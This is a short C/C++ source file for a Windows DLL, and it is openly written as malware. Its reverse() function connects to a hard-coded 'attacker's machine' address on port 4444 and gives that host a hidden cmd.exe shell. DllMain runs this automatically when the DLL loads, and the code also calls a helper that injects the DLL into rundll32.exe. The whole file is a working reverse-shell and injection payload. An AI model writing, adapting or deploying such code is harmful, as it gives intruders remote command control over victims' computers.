#include <winsock2.h>
#include <stdio.h>
#include "tools.h"
#pragma comment(lib, "ws2_32")

int reverse(void) {
	WSADATA wsaData;
	SOCKET wSock;
	struct sockaddr_in sock;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	// listener ip, port on attacker's machine
	char* ip = "192.168.1.240";
	short port = 4444;

	// init socket lib
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// create socket
	wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	sock.sin_addr.s_addr = inet_addr(ip);

	// connect to remote host
	WSAConnect(wSock, (SOCKADDR*)&sock, sizeof(sock), NULL, NULL, NULL, NULL);

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)wSock;

	// start cmd.exe with redirected streams
	CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	exit(0);
}

extern "C" __declspec(dllexport) void FunEntry() {
	LPSTR target_path = "C:\\Windows\\System32\\rundll32.exe";
	DWORD dll_param;
	char dll_path[MAX_PATH];
	DWORD ret = GetModuleFileNameA((HINSTANCE)dll_param, dll_path, MAX_PATH);
	reverse();
	Tools::AutoInject(target_path, dll_path);
}

BOOL APIENTRY DllMain(HMODULE Base, DWORD Callback, LPVOID Param) {
	switch (Callback) {
	case DLL_PROCESS_ATTACH:
		FunEntry();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}